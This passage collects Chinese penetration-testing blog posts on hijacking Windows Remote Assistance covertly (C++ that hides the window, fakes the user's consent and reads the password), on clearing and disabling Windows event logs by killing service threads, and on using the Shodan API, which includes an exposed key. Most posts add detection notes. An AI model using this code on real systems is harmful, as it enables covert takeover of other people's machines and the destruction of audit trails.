<p>修改注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs</code>不会触发这个后门</p>

<h2 id="0x08-小结">0x08 小结</h2>
<hr>

<p>本文复现了Gookit Banking Trojan中的后门启动方法，分析利用思路，给出防御和检测的建议。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September 10, 2019
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows远程协助的隐蔽执行</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>对于Windows系统，经常会用到远程桌面服务，通过界面对系统进行远程管理。</p>

<p>这其中存在一个不足：使用远程桌面服务进行远程登录(使用另一用户或是踢掉当前用户)，无法获取到当前用户的系统状态。</p>

<p>如果想要查看(甚至是操作)当前用户的桌面，有什么好办法呢？</p>

<p>虽然我们可以通过编写程序来实现界面操作（捕获桌面信息，压缩传输，发送鼠标键盘消息等），但是如果能够使用Windows系统的默认功能，岂不是更好？</p>

<p>答案就是Windows系统的远程协助。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>远程协助的基本操作</li>
  <li>命令行下操作</li>
  <li>编写c++程序隐藏界面，发送键盘消息，模拟用户点击确认</li>
  <li>完整利用流程</li>
  <li>检测方法</li>
</ul>

<h2 id="0x02-远程协助的基本操作">0x02 远程协助的基本操作</h2>
<hr>

<h3 id="1开启远程协助功能">1、开启远程协助功能</h3>

<p><code class="language-plaintext highlighter-rouge">System Properties</code> -&gt; <code class="language-plaintext highlighter-rouge">Remote</code></p>

<p>选中<code class="language-plaintext highlighter-rouge">Allow Remote Assistance connections to this computer</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-1.png" alt="Alt text"></p>

<h3 id="2添加防火墙规则允许远程协助的通信端口">2、添加防火墙规则，允许远程协助的通信端口</h3>

<p><code class="language-plaintext highlighter-rouge">Windows Firewall</code> -&gt; <code class="language-plaintext highlighter-rouge">Allowed Programs</code></p>

<p>选中<code class="language-plaintext highlighter-rouge">Remote Assistance</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-2.png" alt="Alt text"></p>

<h3 id="3启动界面程序">3、启动界面程序</h3>

<p>运行 -&gt; <code class="language-plaintext highlighter-rouge">msra.exe</code></p>

<h3 id="4配置本机为服务端请求其他人协助">4、配置本机为服务端，请求其他人协助</h3>

<p>选中<code class="language-plaintext highlighter-rouge">Invite someone you trust to help you</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-3.png" alt="Alt text"></p>

<p>选中<code class="language-plaintext highlighter-rouge">Save this invitation as a file</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-4.png" alt="Alt text"></p>

<p>保存为文件<code class="language-plaintext highlighter-rouge">Invitation.msrcincident</code></p>

<p>自动弹出界面，生成一个随机密码，记录该密码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-5.png" alt="Alt text"></p>

<h3 id="5控制端发起远程连接">5、控制端发起远程连接</h3>

<p>控制端运行文件<code class="language-plaintext highlighter-rouge">Invitation.msrcincident</code>，填入上一步生成的密码，发起远程连接</p>

<h3 id="6服务端确认连接请求">6、服务端确认连接请求</h3>

<p>服务端弹框，需要用户确认，允许远程协助，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-6.png" alt="Alt text"></p>

<p>选择Yes，远程协助成功建立</p>

<h2 id="0x03-命令行下操作">0x03 命令行下操作</h2>
<hr>

<h3 id="1开启系统远程协助">1、开启系统远程协助</h3>

<p>修改注册表项<code class="language-plaintext highlighter-rouge">HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance</code>下的键值<code class="language-plaintext highlighter-rouge">fAllowToGetHelp</code>，1代表允许，0代表禁止</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
</code></pre></div></div>

<h3 id="2配置防火墙规则允许远程协助的通信端口">2、配置防火墙规则，允许远程协助的通信端口</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall firewall set rule group="Remote Assistance" new enable=Yes
</code></pre></div></div>

<h3 id="3创建远程协助文件后台等待用户连接">3、创建远程协助文件，后台等待用户连接</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msra /saveasfile c:\test\1.msrcIncident 123456789012
</code></pre></div></div>

<p>保存文件路径为<code class="language-plaintext highlighter-rouge">c:\test\1.msrcIncident</code>，连接密码为<code class="language-plaintext highlighter-rouge">123456789012</code></p>

<h2 id="0x04-编写c程序隐藏界面发送键盘消息模拟用户点击确认">0x04 编写c程序隐藏界面，发送键盘消息，模拟用户点击确认</h2>
<hr>

<h3 id="1隐藏msraexe的界面">1、隐藏msra.exe的界面</h3>

<p>获得窗口句柄，将窗口属性设置为隐藏</p>

<p>需要注意不同语言的系统中msra.exe的窗口标题不同，例如中文系统的窗口标题为<code class="language-plaintext highlighter-rouge">Windows 远程协助</code>，英文系统的窗口标题为<code class="language-plaintext highlighter-rouge">Windows Remote Assistance</code></p>

<p>可以先对当前系统语言作判断，接着寻找对应的窗口标题</p>

<p>为了使界面完全隐藏，需要加入循环判断，只要找到msra.exe的窗口立即对其隐藏</p>

<p>可供参考的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
int main()
{
	char *Title = NULL;
	LANGID lid = GetSystemDefaultLangID();
	printf("[*]LanguageID:0x%04x\n",lid);
	switch (lid)
	{
		case 0X0804:
			printf("[*]Language:Chinese\n",lid);
			Title = "Windows 远程协助";
			break;
		case 0x0409:
			printf("[*]Language:Englisth\n",lid);
			Title = "Windows Remote Assistance";
			break;
	}
	for(int i=0;i&lt;1;i)
	{
		HWND hwnd = FindWindow(NULL, Title);
		ShowWindow(hwnd, SW_HIDE); 
		Sleep(100);
	}
}
</code></pre></div></div>

<p>编译生成<code class="language-plaintext highlighter-rouge">msra-hide.exe</code></p>

<h3 id="2模拟输入键盘消息左箭头-和回车确认键">2、模拟输入键盘消息，左箭头(&lt;-)和回车确认键</h3>

<p>正常情况下，控制端成功输入密码后，服务端会弹框提示用户是否允许远程协助</p>

<p>这里通过程序实现模拟用户输入，选中<code class="language-plaintext highlighter-rouge">Yes</code>，对应的键盘操作为左箭头(&lt;-)和回车确认键</p>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
int main()
{
	char *Title = NULL;
	LANGID lid = GetSystemDefaultLangID();
	printf("[*]LanguageID:0x%04x\n",lid);
	switch (lid)
	{
		case 0X0804:
			printf("[*]Language:Chinese\n",lid);
			Title = "Windows 远程协助";
			break;
		case 0x0409:
			printf("[*]Language:Englisth\n",lid);
			Title = "Windows Remote Assistance";
			break;
	}
	HWND hwnd = FindWindow(NULL, Title);
	SetActiveWindow(hwnd);
	SetForegroundWindow(hwnd);
	SetFocus(hwnd);
	keybd_event(37,0,0,0);
	keybd_event(37,0,KEYEVENTF_KEYUP,0);
	keybd_event(13,0,0,0);
	keybd_event(13,0,KEYEVENTF_KEYUP,0);
}
</code></pre></div></div>

<p>编译生成<code class="language-plaintext highlighter-rouge">msra-allow.exe</code></p>

<h3 id="3扩展获得远程协助窗口的连接密码">3、扩展：获得远程协助窗口的连接密码</h3>

<p>通过枚举子窗口获得连接密码</p>

<p>使用API FindWindow获得窗口句柄</p>

<p>使用API EnumChildWindows遍历窗口所有子窗口，获得密码内容</p>

<p>API EnumChildWindows会自动枚举，直至获得最后一个子窗口或者函数返回0</p>

<p>实际测试发现第二个子窗口保存密码，所以在获得密码后函数返回0提前结束枚举</p>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
int status = 0;
BOOL CALLBACK EnumMainWindow(HWND hwnd, LPARAM lParam)
{
	const int BufferSize = 1024;
	char BufferContent[BufferSize] = "";
	SendMessage(hwnd, WM_GETTEXT, (WPARAM)BufferSize, (LPARAM)BufferContent);
	status++;
	if (status == 2)
	{
		printf("[+]Find Password\n");      
		printf("%s\n", BufferContent);
		return 0;
	}
	return 1;
}
int main()
{
	char *Title = NULL;
	LANGID lid = GetSystemDefaultLangID();
	printf("[*]LanguageID:0x%04x\n",lid);
	switch (lid)
	{
		case 0X0804:
			printf("[*]Language:Chinese\n",lid);
			Title = "Windows 远程协助";
            break;
       case 0x0409:
			printf("[*]Language:Englisth\n",lid);
			Title = "Windows Remote Assistance";
            break;
    }     
	HWND hwnd = FindWindow(NULL, Title);
	if(hwnd)
	{
		printf("[+]Find Window\n");     
		EnumChildWindows(hwnd, EnumMainWindow, 0);
	}
	else
	{
		printf("[!]No Window\n");  
	}
} 
</code></pre></div></div>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/3-1.png" alt="Alt text"></p>

<h2 id="0x05-完整利用流程">0x05 完整利用流程</h2>
<hr>

<h3 id="1开启远程协助">1、开启远程协助</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh advfirewall firewall set rule group="Remote Assistance" new enable=Yes
</code></pre></div></div>

<h3 id="2运行拦截程序msra-hideexe隐藏msra窗口">2、运行拦截程序msra-hide.exe，隐藏msra窗口</h3>

<p>需要管理员权限</p>

<h3 id="3生成远程协助邀请文件">3、生成远程协助邀请文件</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msra /saveasfile c:\test\1.msrcIncident 123456789012
</code></pre></div></div>

<h3 id="4控制端进行连接">4、控制端进行连接</h3>

<p>获得文件<code class="language-plaintext highlighter-rouge">1.msrcIncident</code>并执行，输入连接密码</p>

<h3 id="5运行模拟键盘输入程序msra-allowexe允许远程协助">5、运行模拟键盘输入程序msra-allow.exe，允许远程协助</h3>

<p>需要管理员权限</p>

<h3 id="6控制端获得远程协助的桌面">6、控制端获得远程协助的桌面</h3>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/4-1.png" alt="Alt text"></p>

<h3 id="7控制端请求获得服务端的鼠标操作权限">7、控制端请求获得服务端的鼠标操作权限</h3>

<p>在控制界面选择<code class="language-plaintext highlighter-rouge">请求控制</code></p>

<h3 id="8再次运行模拟键盘输入程序msra-allowexe允许鼠标操作">8、再次运行模拟键盘输入程序msra-allow.exe，允许鼠标操作</h3>

<p>需要管理员权限</p>

<p>控制端成功获得控制服务端鼠标</p>

<p>至此，成功获得目标系统的桌面操作权限</p>

<h3 id="9清除连接记录">9、清除连接记录</h3>

<p>远程协助的记录保存位置：<code class="language-plaintext highlighter-rouge">%SystemDrive%\Users\user_name\Documents\Remote Assistance Logs</code></p>

<p>命名规则: <code class="language-plaintext highlighter-rouge">YYYYMMDDHHMMSS.xml</code> (24小时时间格式)</p>

<p>日志文件内保存连接时间</p>

<h2 id="0x06-检测方法">0x06 检测方法</h2>
<hr>

<p>本文介绍的方法前提是已经取得了系统的管理员权限，代表该系统已经被攻破</p>

<p>结合利用思路，可以通过以下方法检测：</p>

<ul>
  <li>注册表<code class="language-plaintext highlighter-rouge">HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance</code>键值被修改</li>
  <li>防火墙规则被修改</li>
  <li>启动进程msra.exe</li>
  <li>生成新文件夹<code class="language-plaintext highlighter-rouge">%SystemDrive%\Users\user_name\Documents\Remote Assistance Logs</code></li>
  <li>开放的异常端口</li>
</ul>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文对Windows远程协助的功能进行了介绍，编写程序实现Windows远程协助的隐蔽执行，结合利用思路给出检测方法</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on April  4, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows日志的删除与绕过</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试过程中，Windows日志往往会记录系统上的敏感操作，如添加用户，远程登录执行等。</p>

<p>对于一次完整的渗透测试，通常会选择对Windows日志进行清除和绕过，而对于防御者来说，了解常用的绕过方法也有助于更好的保护自己的系统。</p>

<p>所以本文将要介绍常见的Windows日志清除与绕过方法，分享经验，帮助大家。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Windows日志的常用清除方法</li>
  <li>Windows日志的两种绕过方法</li>
</ul>

<h2 id="0x02-windows日志">0x02 Windows日志</h2>
<hr>

<p>Windows日志包括五个类别：</p>

<ul>
  <li>应用程序</li>
  <li>安全</li>
  <li>Setup</li>
  <li>系统</li>
  <li>转发事件</li>
</ul>

<p><strong>查看方式：</strong></p>

<p><strong>1、</strong> 通过面板</p>

<p>位置如下：</p>

<p><code class="language-plaintext highlighter-rouge">Control Panel\System and Security-View event logs-Windows Logs</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-23/2-1.png" alt="Alt text"></p>

<p><strong>2、</strong> 通过Powershell</p>

<p>常用命令如下：</p>

<p>(管理员权限)</p>

<p>查看所有日志：</p>

<p><code class="language-plaintext highlighter-rouge">Get-WinEvent</code></p>

<p>查看应用程序类别下的日志：</p>

<p><code class="language-plaintext highlighter-rouge">Get-WinEvent -FilterHashtable @{logname="Application";}</code></p>

<h2 id="0x03-windows日志的常用清除方法">0x03 Windows日志的常用清除方法</h2>
<hr>

<h3 id="1wevtutilexe">1、wevtutil.exe</h3>

<p>操作系统默认包含，支持系统：Win7及以上</p>

<p>常用命令如下：</p>

<p><strong>(1)</strong> 统计日志列表，查询所有日志信息，包含时间，数目</p>

<p><code class="language-plaintext highlighter-rouge">wevtutil.exe gli Application</code></p>

<p>操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-23/2-2.png" alt="Alt text"></p>

<p><strong>(2)</strong> 查看指定类别的日志内容</p>

<p><code class="language-plaintext highlighter-rouge">wevtutil qe /f:text Application</code></p>

<p>操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-23/2-3.png" alt="Alt text"></p>

<p><strong>(3)</strong> 删除该类日志所有内容</p>

<p><code class="language-plaintext highlighter-rouge">wevtutil cl Application</code></p>

<p>操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-23/2-4.png" alt="Alt text"></p>

<p>Application日志全部清除，数目为0</p>

<p><strong>(4)</strong> 删除单条内容</p>

<p>尚不支持</p>

<h3 id="2nsa-danderspiritz">2、NSA DanderSpiritz</h3>

<p>DanderSpritz是NSA的一款界面化的远控工具</p>

<p>相关介绍可参考：</p>

<p>https://3gstudent.github.io/3gstudent.github.io/NSA-DanderSpiritz%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90%E4%B8%8E%E6%B5%8B%E8%AF%95/</p>

<p>常用命令如下：</p>

<p><strong>(1)</strong> 统计日志列表，查询所有日志信息，包含时间，数目</p>

<p><code class="language-plaintext highlighter-rouge">eventlogquery -log Application</code></p>

<p><strong>(2)</strong> 查看指定类别的日志内容</p>

<p><code class="language-plaintext highlighter-rouge">eventlogfilter -log Application -num 10</code></p>

<p><strong>(3)</strong> 删除该类日志所有内容</p>

<p><code class="language-plaintext highlighter-rouge">eventlogclear -log Application</code></p>

<p><strong>(4)</strong> 删除单条内容</p>

<p><code class="language-plaintext highlighter-rouge">eventlogedit -log Application -record 1</code></p>

<p><strong>注：</strong></p>

<p>record序号可通过eventlogfilter获得</p>

<h2 id="0x04-windows日志的绕过方法">0x04 Windows日志的绕过方法</h2>
<hr>

<p>本文介绍的思路参考自Halil Dalabasmaz@hlldz的文章，地址如下：</p>

<p>https://artofpwn.com/phant0m-killing-windows-event-log.html</p>

<p><strong>绕过原理：</strong></p>

<p>Windows日志对应于eventlog服务，找到该服务对应的进程svchost.exe，进而筛选出svchost.exe进程中具体实现日志功能的线程，调用TerminateThread结束线程，破坏日志记录功能</p>

<p><strong>特别的地方：</strong></p>

<p>由于只结束了实现日志功能的线程，所以Windows Event Log服务没有被破坏，状态仍为正在运行</p>

<h3 id="绕过方法一">绕过方法一</h3>

<p><strong>1、</strong> 定位eventlog服务对应进程svchost.exe的pid</p>

<p><strong>2、</strong> 遍历该进程中的所有线程</p>

<p><strong>3、</strong> 判断线程是否满足条件</p>

<p>Windows Event Log 服务需要调用wevtsvc.dll，完整路径为<code class="language-plaintext highlighter-rouge">%WinDir%\System32\wevtsvc.dll</code></p>

<p>并且，如果线程调用了wevtsvc.dll，就可以判读该线程实现了日志记录功能</p>

<p><strong>4、</strong> 结束线程</p>

<p>使用TerminateThread</p>

<p><strong>注：</strong></p>

<p>Halil Dalabasmaz@hlldz使用powershell实现了方法一，完整代码可参考：</p>

<p>https://github.com/hlldz/Invoke-Phant0m</p>

<p>powershell脚本执行后，Windows日志功能失效，无法记录日志，操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-23/3-1.png" alt="Alt text"></p>

<p><strong>5、</strong> 恢复方法</p>

<p>结束进程svchost.exe</p>

<p>重新开启Windows Event Log 服务：</p>

<p><code class="language-plaintext highlighter-rouge">net start eventlog</code></p>

<p>操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-23/3-2.png" alt="Alt text"></p>

<h3 id="绕过方法二">绕过方法二</h3>

<p><strong>1、</strong> 定位eventlog服务对应进程svchost.exe的pid</p>

<p>powershell代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId</code></p>

<p>找到svchost.exe的pid为7008，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-23/4-1.png" alt="Alt text"></p>

<p><strong>2、</strong> 遍历该进程中的所有线程</p>

<p>使用PsList</p>

<p><strong>下载地址：</strong></p>

<p>https://technet.microsoft.com/en-us/sysinternals/bb896682.aspx</p>

<p>具体参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">pslist.exe /accepteula -d 7008</code></p>

<p>获取进程svchost.exe中的所有线程，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-23/4-2.png" alt="Alt text"></p>

<p><strong>3、</strong> 判断线程是否满足条件</p>

<p>获取线程对应的服务，如果为eventlog，则满足条件</p>

<p>使用工具：ScTagQuery</p>

<p><strong>下载地址：</strong></p>

<p>http://www.winsiderss.com/tools/sctagquery/sctagqry.zip</p>

<p>具体参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">sctagqry.exe -t 7928</code></p>

<p>根据返回的结果Service Tag，判断线程对应的服务</p>

<p>找到对应eventlog的线程，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-23/4-3.png" alt="Alt text"></p>

<p>线程8136符合条件，依次尝试，直到获取所有符合条件线程</p>

<p><strong>注：</strong></p>

<p>使用Process Explorer可以简化此过程</p>

<p>找到eventlog服务对应进程svchost.exe</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-23/4-4.png" alt="Alt text"></p>

<p>右键查看属性，选择Threads标签，查看线程,可直接获得线程对应的服务</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-23/4-5.png" alt="Alt text"></p>

<p>符合条件的线程TID为：</p>

<ul>
  <li>8136</li>
  <li>8052</li>
  <li>6708</li>
  <li>2316</li>
  <li>6356</li>
</ul>

<p><strong>4、</strong> 结束线程</p>

<p>调用TerminateThread</p>

<p>通过c++实现，部分代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int main(int argc, char* argv[])
{	
	printf("TerminateThread TID:\n");   	
	for(int i=1;i&lt;argc;i++)
	{	
		printf("%s\n",argv[i]);
		HANDLE hThread = OpenThread(0x0001, FALSE,atoi(argv[i]));
		if(TerminateThread(hThread,0)==0)
			printf("[!] TerminateThread Error, TID: %s \n",argv[i]);
		CloseHandle(hThread);
	}  
	return 0;
}
</code></pre></div></div>

<p>完整代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Windwos-EventLog-Bypass/blob/master/TerminateEventLogThread.cpp</p>

<p>控制台支持传入多个参数，向其传入5个TID： 8136 8052 6708 2316 6356</p>

<p>自动结束对应线程，日志功能失效</p>

<p>具体操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-23/4-6.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>稍后我会在github上更新该绕过方法的完整实现代码，地址如下：</p>

<p>https://github.com/3gstudent/Windwos-EventLog-Bypass</p>

<h2 id="0x05-补充">0x05 补充</h2>
<hr>

<h3 id="1安装sysmon可对windows日志功能进行扩展">1、安装sysmon可对Windows日志功能进行扩展</h3>

<p>相关介绍和绕过思路可参考;</p>

<p>https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87APC%E5%AE%9E%E7%8E%B0Dll%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87Sysmon%E7%9B%91%E6%8E%A7/</p>

<h3 id="2绕过方法仅针对windows日志">2、绕过方法仅针对Windows日志</h3>

<p>对应用程序和服务日志失效，例如Windows Powershell</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-23/5-1.png" alt="Alt text"></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对Windows日志的清除和绕过方法做了介绍，希望能够帮助大家，接下来会分享绕过方法二的具体程序实现方法。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on June 23, 2017
  </div>

  
</article><article class="post">
  <h1>Shodan API使用指南</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Shodan是一个针对网络设备的搜索引擎，通过Shodan API进行搜索，不仅数据更加丰富，而且能够配合自己的程序实现自动化分析。</p>

<p>本文将要介绍Shodan API在使用过程需要注意的问题，分享使用心得和脚本开发技巧。</p>

<h2 id="0x01-本文将要介绍以下内容">0x01 本文将要介绍以下内容</h2>
<hr>

<ul>
  <li>Shodan API的简单使用</li>
  <li>利用python调用Shodan API获得搜索结果</li>
  <li>对搜索结果作进一步处理</li>
  <li>三种积分(credits)的区别</li>
  <li>通过Shodan官网导出搜索结果和进一步处理</li>
</ul>

<h2 id="0x02-shodan-api的简单使用">0x02 Shodan API的简单使用</h2>
<hr>

<h3 id="1注册账号获得api-key">1、注册账号，获得API Key</h3>

<p>测试API Key为：<code class="language-plaintext highlighter-rouge">SkVS0RAbiTQpzzEsahqnq2Hv6SwjUfs3</code></p>

<h3 id="2安装python包">2、安装python包</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install shodan
</code></pre></div></div>

<h3 id="3通过shodan-cli获得搜索结果">3、通过Shodan CLI获得搜索结果</h3>

<p>参考资料：</p>

<p>https://cli.shodan.io/</p>

<p><strong>注：</strong></p>

<p>未付费只能获得100个搜索结果</p>

<p>CLI全称为command-line interface，即shodan的命令行模式</p>

<p>Windows系统下使用pip install在同级目录产生文件Shodan.exe</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-26/2-1.png" alt="Alt text"></p>

<h4 id="1-初始化">(1) 初始化</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shodan init &lt;api key&gt;
</code></pre></div></div>

<p>实际命令为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shodan init SkVS0RAbiTQpzzEsahqnq2Hv6SwjUfs3
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-26/2-2.png" alt="Alt text"></p>

<h4 id="2-搜索指定内容apache的数量">(2) 搜索指定内容（apache）的数量</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shodan count apache
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-26/2-3.png" alt="Alt text"></p>

<p>获得结果<code class="language-plaintext highlighter-rouge">23803090</code></p>

<h4 id="3-搜索指定内容apache的信息">(3) 搜索指定内容（apache）的信息</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shodan search --fields ip_str,port,org,hostnames apache
</code></pre></div></div>

<p>搜索关键词：apache</p>

<p>输出：ip_str,port,org,hostnames</p>

<h4 id="4-下载指定内容apache的搜索结果">(4) 下载指定内容（apache）的搜索结果</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shodan download result apache
</code></pre></div></div>

<p>搜索关键词：apache</p>

<p>保存文件名：result.json.gz</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-26/2-4.png" alt="Alt text"></p>

<h4 id="5-解析文件获得搜索结果">(5) 解析文件，获得搜索结果</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shodan parse --fields ip_str,port,org --separator , result.json.gz
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-26/2-5.png" alt="Alt text"></p>

<h4 id="6-搜索指定ip的信息">(6) 搜索指定IP的信息</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shodan host 189.201.128.250
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-26/2-6.png" alt="Alt text"></p>

<h2 id="0x03-三种积分credits的区别">0x03 三种积分(credits)的区别</h2>
<hr>

<p>Shodan共有三种积分(credits)：</p>

<ul>
  <li>Export credits</li>
  <li>Query credits</li>
  <li>Scan credits</li>
</ul>

<p>官方文档：</p>

<p>https://help.shodan.io/the-basics/credit-types-explained</p>

<p>简单理解：</p>

<h3 id="export-credits">Export Credits</h3>

<p>通过Shodan官网下载数据时使用</p>

<p>1 export credit = 10,000 results</p>

<p><strong>注：</strong></p>

<p>导出一次结果消耗一个credit，无论获取到的结果有多少，最多为10000个结果</p>

<p>月初不会更新</p>

<h3 id="query-credits">Query Credits</h3>

<p>调用Shodan API时使用</p>

<p>1 query credit = 100 results</p>

<p>月初更新，也就是说如果只买了一个月的会员，那么下一个月清零</p>

<h3 id="scan-credits">Scan Credits</h3>

<p>调用Shodan API时使用</p>

<p>1 scan credit = 1 IP</p>

<p>月初更新</p>

<h2 id="0x04-通过python调用shodan-api获得搜索结果">0x04 通过python调用Shodan API获得搜索结果</h2>
<hr>

<p><strong>注：</strong></p>

<p>未付费不仅无法使用搜索过滤条件，而且只能获得100个搜索结果</p>

<h3 id="1-搜索指定内容apache的信息">(1) 搜索指定内容（apache）的信息</h3>

<p>python代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import shodan
SHODAN_API_KEY = "SkVS0RAbiTQpzzEsahqnq2Hv6SwjUfs3"
api = shodan.Shodan(SHODAN_API_KEY)
try:
    results = api.search('Apache')
    print 'Results found: %s' % results['total']
    for result in results['matches']:         
            print ("%s:%s|%s|%s"%(result['ip_str'],result['port'],result['location']['country_name'],result['hostnames']))
except shodan.APIError, e:
    print 'Error: %s' % e
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-26/3-1.png" alt="Alt text"></p>

<p>如果未付费，无法使用搜索过滤条件，例如<code class="language-plaintext highlighter-rouge">Apache country:"US"</code></p>

<h3 id="2-搜索指定内容将获得的ip写入文件">(2) 搜索指定内容，将获得的IP写入文件</h3>

<p>python代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import shodan
SHODAN_API_KEY = "SkVS0RAbiTQpzzEsahqnq2Hv6SwjUfs3"
api = shodan.Shodan(SHODAN_API_KEY)
file_object = open('ip.txt', 'w')
try:
    results = api.search('Apache')
    print 'Results found: %s' % results['total']
    for result in results['matches']:         
#            print result['ip_str']
            file_object.writelines(result['ip_str']+'\n')
except shodan.APIError, e:
    print 'Error: %s' % e
file_object.close()  
</code></pre></div></div>

<h3 id="3-通过命令行参数指定搜索条件将搜索到的ip写入文件">(3) 通过命令行参数指定搜索条件，将搜索到的IP写入文件</h3>

<p>python代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import shodan
import sys
SHODAN_API_KEY = "SkVS0RAbiTQpzzEsahqnq2Hv6SwjUfs3"
api = shodan.Shodan(SHODAN_API_KEY)
if len(sys.argv)&lt;2:
